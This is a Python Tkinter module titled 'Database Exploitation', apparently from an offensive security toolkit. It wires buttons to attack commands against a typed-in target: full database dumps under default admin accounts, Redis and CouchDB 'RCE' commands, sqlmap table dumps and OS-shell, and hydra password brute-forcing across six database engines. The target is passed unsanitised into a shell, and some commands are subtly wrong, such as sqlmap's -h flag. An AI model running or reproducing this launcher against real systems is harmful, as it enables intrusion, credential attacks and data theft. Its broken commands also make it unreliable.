import tkinter as tk
from tkinter import ttk, messagebox
import subprocess, threading, os, shutil
from datetime import datetime
from gui.base_module import BaseModule

class DatabaseToolkit(BaseModule):
    def __init__(self, parent, db, logger):
        super().__init__(parent)
        self.db = db; self.logger = logger

    def build_content(self):
        self.add_title("Database Exploitation", "SQL, NoSQL, Graph, Time-series DB attacks")
        
        tk.Label(self.inner, text="Target (host:port/db):", font=("Courier",10), fg="#fff", bg="#1a1a2e").pack(anchor="w", padx=10)
        self.target_entry = tk.Entry(self.inner, font=("Courier",10), bg="#0f3460", fg="#fff", relief="flat")
        self.target_entry.pack(fill="x", padx=10, pady=3)
        self.target_entry.insert(0, "127.0.0.1:3306")
        
        bf = tk.Frame(self.inner, bg="#1a1a2e"); bf.pack(fill="x", padx=10, pady=5)
        
        tools = self._detect_tools()
        for name, cmd, color in tools:
            tk.Button(bf, text=name, font=("Courier",8), fg="#000", bg=color, relief="flat", padx=6,
                    command=lambda c=cmd: self._run(c)).pack(side="left", padx=2)
        
        tk.Button(bf, text="STOP", font=("Courier",8,"bold"), fg="#fff", bg="#cc0000", relief="flat", padx=6,
                command=self._stop).pack(side="right", padx=2)
        
        self.output = tk.Text(self.inner, font=("Courier",9), bg="#0a0a0a", fg="#00ff88", relief="flat", height=15)
        self.output.pack(fill="both", expand=True, padx=10, pady=5)
        self.status = self.add_status(f"Ready - {len(tools)} database tools detected")

    def _detect_tools(self):
        tools = []
        
        # === MYSQL / MARIADB ===
        if shutil.which("mysql"):
            tools.append(("MySQL Connect","mysql -h HOST -P PORT -u root","#4479a1"))
            tools.append(("MySQL Dump","mysqldump -h HOST -P PORT -u root --all-databases","#4479a1"))
            tools.append(("MySQL Enum","mysql -h HOST -P PORT -u root -e 'SHOW DATABASES;'","#4479a1"))
        if shutil.which("mysqlslap"):
            tools.append(("MySQL Stress","mysqlslap -h HOST -P PORT -u root --concurrency=100","#4479a1"))
        if shutil.which("mysqlchk"):
            tools.append(("MySQL Check","mysqlchk -h HOST -P PORT","#4479a1"))
        
        # === POSTGRESQL ===
        if shutil.which("psql"):
            tools.append(("PSQL Connect","psql -h HOST -p PORT -U postgres","#336791"))
            tools.append(("PSQL Dump","pg_dumpall -h HOST -p PORT -U postgres","#336791"))
            tools.append(("PSQL Enum","psql -h HOST -p PORT -U postgres -c '\\l'","#336791"))
        if shutil.which("pg_isready"):
            tools.append(("PG Check","pg_isready -h HOST -p PORT","#336791"))
        
        # === MSSQL ===
        if shutil.which("sqlcmd"):
            tools.append(("MSSQL Connect","sqlcmd -S HOST,PORT -U sa","#cc2927"))
        if shutil.which("sqsh"):
            tools.append(("MSSQL Enum","sqsh -S HOST -P PORT -U sa","#cc2927"))
        if shutil.which("tsql"):
            tools.append(("TSQL Connect","tsql -H HOST -p PORT -U sa","#cc2927"))
        
        # === ORACLE ===
        if shutil.which("sqlplus"):
            tools.append(("Oracle Connect","sqlplus system@HOST:PORT/XE","#f80000"))
        if shutil.which("tnscmd"):
            tools.append(("Oracle TNS","tnscmd -h HOST -p PORT","#f80000"))
        if shutil.which("odat"):
            tools.append(("ODAT","odat all -s HOST -p PORT","#f80000"))
        
        # === MONGODB ===
        if shutil.which("mongo"):
            tools.append(("Mongo Connect","mongo HOST:PORT","#47a248"))
            tools.append(("Mongo Enum","mongo HOST:PORT --eval 'db.adminCommand({listDatabases:1})'","#47a248"))
        if shutil.which("mongosh"):
            tools.append(("Mongosh","mongosh mongodb://HOST:PORT","#47a248"))
        if shutil.which("mongodump"):
            tools.append(("Mongo Dump","mongodump --host HOST --port PORT","#47a248"))
        
        # === REDIS ===
        if shutil.which("redis-cli"):
            tools.append(("Redis Connect","redis-cli -h HOST -p PORT","#dc382d"))
            tools.append(("Redis Info","redis-cli -h HOST -p PORT INFO","#dc382d"))
            tools.append(("Redis Keys","redis-cli -h HOST -p PORT KEYS '*'","#dc382d"))
            tools.append(("Redis Config","redis-cli -h HOST -p PORT CONFIG GET '*'","#dc382d"))
            tools.append(("Redis RCE","redis-cli -h HOST -p PORT --eval exploit.lua","#dc382d"))
        
        # === COUCHDB ===
        if shutil.which("curl"):
            tools.append(("CouchDB List","curl http://HOST:PORT/_all_dbs","#e42528"))
            tools.append(("CouchDB Users","curl http://HOST:PORT/_users/_all_docs","#e42528"))
            tools.append(("CouchDB RCE","curl -X PUT http://HOST:PORT/_config/query_servers/cmd -d '/bin/bash'","#e42528"))
        
        # === ELASTICSEARCH ===
        if shutil.which("curl"):
            tools.append(("ES Health","curl http://HOST:PORT/_cluster/health","#fed10a"))
            tools.append(("ES Indices","curl http://HOST:PORT/_cat/indices","#fed10a"))
            tools.append(("ES Search","curl http://HOST:PORT/_search?q=*","#fed10a"))
            tools.append(("ES Nodes","curl http://HOST:PORT/_nodes","#fed10a"))
        
        # === CASSANDRA ===
        if shutil.which("cqlsh"):
            tools.append(("Cassandra Connect","cqlsh HOST PORT","#1287b1"))
            tools.append(("Cassandra Enum","cqlsh HOST PORT -e 'DESC KEYSPACES'","#1287b1"))
        
        # === NEO4J (GRAPH) ===
        if shutil.which("cypher-shell"):
            tools.append(("Neo4j Connect","cypher-shell -a bolt://HOST:PORT","#018bff"))
        if shutil.which("curl"):
            tools.append(("Neo4j REST","curl http://HOST:PORT/db/data/","#018bff"))
        
        # === INFLUXDB (TIME-SERIES) ===
        if shutil.which("influx"):
            tools.append(("Influx Connect","influx -host HOST -port PORT","#22adf6"))
            tools.append(("Influx Query","influx -host HOST -port PORT -execute 'SHOW DATABASES'","#22adf6"))
        
        # === ARANGODB ===
        if shutil.which("arangosh"):
            tools.append(("Arango Connect","arangosh --server.endpoint tcp://HOST:PORT","#dde072"))
        
        # === COCKROACHDB ===
        if shutil.which("cockroach"):
            tools.append(("Cockroach Connect","cockroach sql --host HOST --port PORT","#6933ff"))
        
        # === TARANTool ===
        if shutil.which("tarantool"):
            tools.append(("Tarantool Connect","tarantool -h HOST -p PORT","#ff6c36"))
        
        # === MEMCACHED ===
        if shutil.which("nc"):
            tools.append(("Memcached Stats","echo stats | nc HOST PORT","#5c4a3d"))
            tools.append(("Memcached Dump","echo stats items | nc HOST PORT","#5c4a3d"))
        
        # === ETCD ===
        if shutil.which("etcdctl"):
            tools.append(("etcd Get","etcdctl --endpoints=HOST:PORT get / --prefix","#419eda"))
            tools.append(("etcd Members","etcdctl --endpoints=HOST:PORT member list","#419eda"))
        
        # === FIREBIRD ===
        if shutil.which("isql"):
            tools.append(("Firebird Connect","isql-fb -user SYSDBA -password masterkey HOST:PORT","#ff6600"))
        
        # === DB2 ===
        if shutil.which("db2"):
            tools.append(("DB2 Connect","db2 connect to DBNAME user USER","#054ada"))
        
        # === SYBASE ===
        if shutil.which("isql"):
            tools.append(("Sybase Connect","isql -S HOST -P PORT -U sa","#00aaff"))
        
        # === DB EXPLOITATION TOOLS ===
        if shutil.which("sqlmap"):
            tools.append(("SQLMap","sqlmap -h HOST -p PORT --dbs","#ff4444"))
            tools.append(("SQLMap Tables","sqlmap -h HOST -p PORT -D db --tables","#ff4444"))
            tools.append(("SQLMap Dump","sqlmap -h HOST -p PORT -D db -T table --dump","#ff4444"))
            tools.append(("SQLMap OS-Shell","sqlmap -h HOST -p PORT --os-shell","#ff4444"))
        if shutil.which("sqlninja"):
            tools.append(("SQLNinja","sqlninja -m t -f config.txt","#ff4444"))
        if shutil.which("bbqsql"):
            tools.append(("BBQSQL","bbqsql","#ff4444"))
        if shutil.which("nosqlmap"):
            tools.append(("NoSQLMap","nosqlmap -h HOST -p PORT","#ff4444"))
        if shutil.which("mongoaudit"):
            tools.append(("MongoAudit","mongoaudit","#47a248"))
        
        # === BRUTE FORCE ===
        if shutil.which("hydra"):
            tools.append(("MySQL Brute","hydra -l root -P pass.txt mysql://HOST","#ff4444"))
            tools.append(("PostgreSQL Brute","hydra -l postgres -P pass.txt postgres://HOST","#ff4444"))
            tools.append(("MSSQL Brute","hydra -l sa -P pass.txt mssql://HOST","#ff4444"))
            tools.append(("Oracle Brute","hydra -l system -P pass.txt oracle://HOST","#ff4444"))
            tools.append(("Mongo Brute","hydra -l admin -P pass.txt mongodb://HOST","#ff4444"))
            tools.append(("Redis Brute","hydra -P pass.txt redis://HOST","#ff4444"))
        
        # === AUTO-DISCOVER FUTURE TOOLS ===
        for path in os.environ.get("PATH","").split(":"):
            try:
                for f in os.listdir(path):
                    fpath = os.path.join(path,f)
                    if os.access(fpath, os.X_OK) and f not in [t[1].split()[0] for t in tools]:
                        try:
                            r = subprocess.run([f,"--help"], capture_output=True, text=True, timeout=3)
                            h = (r.stdout + r.stderr).lower()
                            if any(kw in h for kw in ["database","sql","nosql","mysql","postgres","mongo","redis","oracle","mssql","cassandra","elastic","couch","influx","memcached","etcd","neo4j"]):
                                known = ["mysql","psql","mongo","mongosh","redis-cli","cqlsh","sqlplus","sqlcmd","influx","etcdctl","arangosh","cockroach","cypher-shell","isql","db2","sqlmap","hydra","nosqlmap","mongoaudit","sqlninja","bbqsql","odat"]
                                if f not in known:
                                    tools.append((f" {f.title()}","{f} HOST PORT","#666666"))
                        except: pass
            except: pass
        
        return tools

    def _run(self, cmd):
        target = self.target_entry.get().strip()
        if ":" in target:
            host, port = target.split(":")[0], target.split(":")[1] if ":" in target else "3306"
        else:
            host, port = target, ""
        cmd = cmd.replace("HOST", host).replace("PORT", port)
        
        self.output.insert("end", f"\n{'='*60}\n$ {cmd[:80]}\n{'='*60}\n\n")
        self.output.see("end")
        self.status.config(text=f"Running: {cmd.split()[0]}...")
        
        def do():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in p.stdout:
                    self.output.insert("end", line); self.output.see("end")
                p.wait()
                self.status.config(text=f"Done - Exit: {p.returncode}")
            except Exception as e:
                self.output.insert("end", f"\n[X] {e}\n")
        threading.Thread(target=do, daemon=True).start()

    def _stop(self):
        self.output.insert("end", "\n[STOPPED]\n")
        self.status.config(text="Stopped")
